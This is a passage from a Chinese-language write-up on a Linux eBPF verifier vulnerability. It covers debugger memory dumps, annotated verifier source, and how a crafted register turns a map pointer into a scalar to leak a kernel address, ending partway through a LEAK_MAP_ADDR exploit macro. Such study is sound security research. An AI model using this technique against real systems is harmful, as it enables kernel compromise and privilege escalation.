</span><span style="color:#c0c5ce;">    btf_vmlinux_value_type_id = 0x0,
</span><span style="color:#c0c5ce;">    bypass_spec_v1 = 0x1,
</span><span style="color:#c0c5ce;">    frozen = 0x0,
</span><span style="color:#c0c5ce;">    refcnt = {
</span><span style="color:#c0c5ce;">      counter = 0x2
</span><span style="color:#c0c5ce;">    },
</span><span style="color:#c0c5ce;">    usercnt = {
</span><span style="color:#c0c5ce;">      counter = 0x1
</span><span style="color:#c0c5ce;">    },
</span><span style="color:#c0c5ce;">    work = {
</span><span style="color:#c0c5ce;">      data = {
</span><span style="color:#c0c5ce;">        counter = 0x0
</span><span style="color:#c0c5ce;">      },
</span><span style="color:#c0c5ce;">      entry = {
</span><span style="color:#c0c5ce;">        next = 0x0,
</span><span style="color:#c0c5ce;">        prev = 0x0
</span><span style="color:#c0c5ce;">      },
</span><span style="color:#c0c5ce;">      func = 0x0
</span><span style="color:#c0c5ce;">    },
</span><span style="color:#c0c5ce;">    freeze_mutex = {
</span><span style="color:#c0c5ce;">      owner = {
</span><span style="color:#c0c5ce;">        counter = 0x0
</span><span style="color:#c0c5ce;">      },
</span><span style="color:#c0c5ce;">      wait_lock = {
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">          rlock = {
</span><span style="color:#c0c5ce;">            raw_lock = {
</span><span style="color:#c0c5ce;">              {
</span><span style="color:#c0c5ce;">                val = {
</span><span style="color:#c0c5ce;">                  counter = 0x0
</span><span style="color:#c0c5ce;">                },
</span><span style="color:#c0c5ce;">                {
</span><span style="color:#c0c5ce;">                  locked = 0x0,
</span><span style="color:#c0c5ce;">                  pending = 0x0
</span><span style="color:#c0c5ce;">                },
</span><span style="color:#c0c5ce;">                {
</span><span style="color:#c0c5ce;">                  locked_pending = 0x0,
</span><span style="color:#c0c5ce;">                  tail = 0x0
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">              }
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">          }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">      },
</span><span style="color:#c0c5ce;">      osq = {
</span><span style="color:#c0c5ce;">        tail = {
</span><span style="color:#c0c5ce;">          counter = 0x0
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">      },
</span><span style="color:#c0c5ce;">      wait_list = {
</span><span style="color:#c0c5ce;">        next = 0xffffc900000b70c0,
</span><span style="color:#c0c5ce;">        prev = 0xffffc900000b70c0
</span><span style="color:#c0c5ce;">      }
</span><span style="color:#c0c5ce;">    },
</span><span style="color:#c0c5ce;">    writecnt = 0x0
</span><span style="color:#c0c5ce;">  },
</span><span style="color:#c0c5ce;">  elem_size = 0x2000,
</span><span style="color:#c0c5ce;">  index_mask = 0xff,
</span><span style="color:#c0c5ce;">  aux = 0x0,
</span><span style="color:#c0c5ce;">  {
</span><span style="color:#c0c5ce;">    value = 0xffffc900000b7110,
</span><span style="color:#c0c5ce;">    ptrs = 0xffffc900000b7110,
</span><span style="color:#c0c5ce;">    pptrs = 0xffffc900000b7110
</span><span style="color:#c0c5ce;">  }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">pwndbg&gt; x/40gx 0xffffc900000b7000
</span><span style="color:#c0c5ce;">0xffffc900000b7000:     0xffffffff82b0cc00      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7010:     0x0000000000000000      0x0000000400000002
</span><span style="color:#c0c5ce;">0xffffc900000b7020:     0x0000010000002000      0xffffffea00000000
</span><span style="color:#c0c5ce;">0xffffc900000b7030:     0xffffffff00000001      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7040:     0x0000000000000000      0xffff888005726000
</span><span style="color:#c0c5ce;">0xffffc900000b7050:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7060:     0x0000000100000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7070:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7080:     0x0000000000000002      0x0000000000000001
</span><span style="color:#c0c5ce;">0xffffc900000b7090:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b70a0:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b70b0:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b70c0:     0xffffc900000b70c0      0xffffc900000b70c0
</span><span style="color:#c0c5ce;">0xffffc900000b70d0:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b70e0:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b70f0:     0x0000000000000000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7100:     0x000000ff00002000      0x0000000000000000
</span><span style="color:#c0c5ce;">0xffffc900000b7110:     0x0000000000000000      0x0000010000002000
</span><span style="color:#c0c5ce;">0xffffc900000b7120:     0x0000000000000000      0x0000000000000000
</span></pre>
<p>调试信息如上 value指针（零长度数组/柔性数组）位于0xffffc900000b7110，距离开头ops偏移0x110</p>
<blockquote>
<p>verifier 要求不能有回向边 无法往前遍历读取</p>
</blockquote>
<h4 id="leak-map-address">Leak map address</h4><p>接着想获得map的地址，才能尝试对存储的ops之类的值做修改</p>
<p><code>BPF_FUNC_map_lookup_elem()</code>会返回指向value的指针
但不能直接将指针值存放到map中读取到 因为verifier会检查寄存器类型 阻止指针泄漏发生</p>
<p>指向value指针被标记类型为<code>PTR_TO_MAP_VALUE</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(fn-&gt;ret_type == RET_PTR_TO_MAP_VALUE_OR_NULL ||
</span><span style="color:#c0c5ce;">	   fn-&gt;ret_type == RET_PTR_TO_MAP_VALUE) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* There is no offset yet applied, variable or fixed */
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">mark_reg_known_zero</span><span style="color:#c0c5ce;">(env, regs, BPF_REG_0);
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* remember map_ptr, so that check_map_access()
</span><span style="color:#65737e;">	 * can check &#39;value_size&#39; boundary of memory access
</span><span style="color:#65737e;">	 * to map element returned from bpf_map_lookup_elem()
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(meta.</span><span style="color:#bf616a;">map_ptr </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">verbose</span><span style="color:#c0c5ce;">(env,
</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">kernel subsystem misconfigured verifier</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	regs[BPF_REG_0].</span><span style="color:#bf616a;">map_ptr </span><span style="color:#c0c5ce;">= meta.</span><span style="color:#bf616a;">map_ptr</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fn-&gt;ret_type == RET_PTR_TO_MAP_VALUE) {
</span><span style="color:#c0c5ce;">		regs[BPF_REG_0].</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= PTR_TO_MAP_VALUE;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">map_value_has_spin_lock</span><span style="color:#c0c5ce;">(meta.</span><span style="color:#bf616a;">map_ptr</span><span style="color:#c0c5ce;">))
</span><span style="color:#c0c5ce;">			regs[BPF_REG_0].</span><span style="color:#bf616a;">id </span><span style="color:#c0c5ce;">= ++env-&gt;id_gen;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		regs[BPF_REG_0].</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= PTR_TO_MAP_VALUE_OR_NULL;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<blockquote>
<p>When verifier sees load or store instructions the type of base register can be: PTR_TO_MAP_VALUE, PTR_TO_CTX, PTR_TO_STACK, PTR_TO_SOCKET. These are four pointer types recognized by check_mem_access() function.</p>
</blockquote>
<p>load或store操作均会使用<code>check_mem_access()</code>检查
如果存储操作使用的指针类型是<code>PTR_TO_MAP_VALUE</code>，且env中没有设置<code>allow_ptr_leaks</code>，则不允许将除了<code>SCALAR_VALUE</code>类型之外的值存到map中</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* check whether memory at (regno + off) is accessible for t = (read | write)
</span><span style="color:#65737e;"> * if t==write, value_regno is a register which value is stored into memory
</span><span style="color:#65737e;"> * if t==read, value_regno is a register which will receive the value from memory
</span><span style="color:#65737e;"> * if t==write &amp;&amp; value_regno==-1, some unknown value is stored into memory
</span><span style="color:#65737e;"> * if t==read &amp;&amp; value_regno==-1, don&#39;t care what we read from memory
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">check_mem_access</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">insn_idx</span><span style="color:#c0c5ce;">, u32 </span><span style="color:#bf616a;">regno</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			    </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">off</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">bpf_size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_access_type </span><span style="color:#bf616a;">t</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			    </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">value_regno</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">bool </span><span style="color:#bf616a;">strict_alignment_once</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *regs = </span><span style="color:#8fa1b3;">cur_regs</span><span style="color:#c0c5ce;">(env);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *reg = regs + regno;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;type == PTR_TO_MAP_VALUE) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(t == BPF_WRITE &amp;&amp; value_regno &gt;= </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp;
</span><span style="color:#c0c5ce;">		    </span><span style="color:#8fa1b3;">is_pointer_value</span><span style="color:#c0c5ce;">(env, value_regno)) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">verbose</span><span style="color:#c0c5ce;">(env, &quot;</span><span style="color:#a3be8c;">R</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> leaks addr into map</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, value_regno);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EACCES;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">is_pointer_value</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *env, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> regno)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">__is_pointer_value</span><span style="color:#c0c5ce;">(env-&gt;allow_ptr_leaks, </span><span style="color:#8fa1b3;">reg_state</span><span style="color:#c0c5ce;">(env, regno));
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">__is_pointer_value</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> allow_ptr_leaks,
</span><span style="color:#c0c5ce;">			       </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_reg_state *reg)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(allow_ptr_leaks)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> reg-&gt;type != SCALAR_VALUE;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>接着看如何绕过这个限制 显然需要将指针从<code>PTR_TO_MAP_VALUE</code>变成<code>SCALAR_VALUE</code></p>
<p>先看把漏洞寄存器的第32位unknwon消去的操作</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">BPF_MOV32_REG</span><span style="color:#c0c5ce;">(VULN_REG, VULN_REG)
</span></pre>
<p>调用到<code>zext_32_to_64()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* R1 = (u32) R2 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">is_pointer_value</span><span style="color:#c0c5ce;">(env, insn-&gt;src_reg)) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">verbose</span><span style="color:#c0c5ce;">(env,
</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">R</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> partial copy of pointer</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">			insn-&gt;src_reg);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EACCES;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(src_reg-&gt;type == SCALAR_VALUE) {
</span><span style="color:#c0c5ce;">		*dst_reg = *src_reg;
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Make sure ID is cleared otherwise
</span><span style="color:#65737e;">		 * dst_reg min/max could be incorrectly
</span><span style="color:#65737e;">		 * propagated into src_reg by find_equal_scalars()
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		dst_reg-&gt;id = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;live |= REG_LIVE_WRITTEN;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;subreg_def = env-&gt;insn_idx + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">mark_reg_unknown</span><span style="color:#c0c5ce;">(env, regs,
</span><span style="color:#c0c5ce;">				 insn-&gt;dst_reg);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">zext_32_to_64</span><span style="color:#c0c5ce;">(dst_reg); </span><span style="color:#65737e;">// 走这里
</span></pre>
<p>mask只保留32位 则消去高位的unkown位</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* BPF architecture zero extends alu32 ops into 64-bit registesr */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">zext_32_to_64</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg_assign_32_into_64</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">tnum_cast</span><span style="color:#c0c5ce;">(a, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_cast</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, u8 </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	a.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">&amp;= (</span><span style="color:#d08770;">1ULL </span><span style="color:#c0c5ce;">&lt;&lt; (size * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	a.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp;= (</span><span style="color:#d08770;">1ULL </span><span style="color:#c0c5ce;">&lt;&lt; (size * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> a;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>并且这里把寄存器的<code>umin_value</code>和<code>umax_value</code>按照32位最小/大值赋值，有符号也同样</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__reg_assign_32_into_64</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	reg-&gt;umin_value = reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;">	reg-&gt;umax_value = reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Attempt to pull 32-bit signed bounds into 64-bit bounds
</span><span style="color:#65737e;">	 * but must be positive otherwise set to worse case bounds
</span><span style="color:#65737e;">	 * and refine later from tnum.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;s32_min_value &gt;= </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; reg-&gt;s32_max_value &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		reg-&gt;smax_value = reg-&gt;s32_max_value;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">		reg-&gt;smax_value = U32_MAX;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;s32_min_value &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		reg-&gt;smin_value = reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">		reg-&gt;smin_value = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>接着看将指针寄存器构造成标量的操作
把指针和一个构造的漏洞寄存器相加 后者为标量 进入<code>adjust_ptr_min_max_vals()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(src_reg-&gt;type != SCALAR_VALUE) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dst_reg-&gt;type != SCALAR_VALUE) {
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(ptr_reg) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 走这里
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* pointer += scalar */
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">mark_chain_precision</span><span style="color:#c0c5ce;">(env, insn-&gt;src_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">adjust_ptr_min_max_vals</span><span style="color:#c0c5ce;">(env, insn,
</span><span style="color:#c0c5ce;">					   dst_reg, src_reg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>由于构造的漏洞寄存器 经过前面提到的<code>__reg_assign_32_into_64()</code>函数，64位边界值也被按照32位做了赋值，满足<code>(known &amp;&amp; (smin_val != smax_val || umin_val != umax_val))</code> 故进入<code>__mark_reg_unknown()</code> 将dst_reg设置为了标量 从而后续能够读取到指针值</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
</span><span style="color:#65737e;"> * Caller should also handle BPF_MOV case separately.
</span><span style="color:#65737e;"> * If we return -EACCES, caller may want to try again treating pointer as a
</span><span style="color:#65737e;"> * scalar.  So we only emit a diagnostic if !env-&gt;allow_ptr_leaks.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">adjust_ptr_min_max_vals</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				   </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *</span><span style="color:#bf616a;">insn</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				   </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">ptr_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				   </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">off_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_state *vstate = env-&gt;cur_state;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_func_state *state = vstate-&gt;frame[vstate-&gt;curframe];
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *regs = state-&gt;regs, *dst_reg;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> known = </span><span style="color:#8fa1b3;">tnum_is_const</span><span style="color:#c0c5ce;">(off_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,
</span><span style="color:#c0c5ce;">	    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;
</span><span style="color:#c0c5ce;">	u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,
</span><span style="color:#c0c5ce;">	    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;
</span><span style="color:#c0c5ce;">	u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;
</span><span style="color:#c0c5ce;">	u8 opcode = </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(insn-&gt;code);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	dst_reg = &amp;regs[dst];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||
</span><span style="color:#c0c5ce;">	    smin_val &gt; smax_val || umin_val &gt; umax_val) {
</span><span style="color:#c0c5ce;">	    </span><span style="color:#65737e;">// 走这里
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Taint dst register if offset had invalid bounds derived from
</span><span style="color:#65737e;">		 * e.g. dead branches.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">__mark_reg_unknown</span><span style="color:#c0c5ce;">(env, dst_reg);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>标记寄存器为unkown时将值设为了标量</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Mark a register as having a completely unknown (scalar) value. */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__mark_reg_unknown</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			       </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">	 * Clear type, id, off, and union(map_ptr, range) and
</span><span style="color:#65737e;">	 * padding between &#39;type&#39; and union
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(reg, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">offsetof</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state, var_off));
</span><span style="color:#c0c5ce;">	reg-&gt;type = SCALAR_VALUE;
</span><span style="color:#c0c5ce;">	reg-&gt;var_off = tnum_unknown;
</span><span style="color:#c0c5ce;">	reg-&gt;frameno = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	reg-&gt;precise = env-&gt;subprog_cnt &gt; </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">|| !env-&gt;bpf_capable;
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__mark_reg_unbounded</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>最终能够将指向map的指针（<code>bpf_array.value</code>）写入map并泄漏得到</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">LEAK_MAP_ADDR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV32_REG</span><span style="color:#c0c5ce;">(VULN_REG, VULN_REG),              \
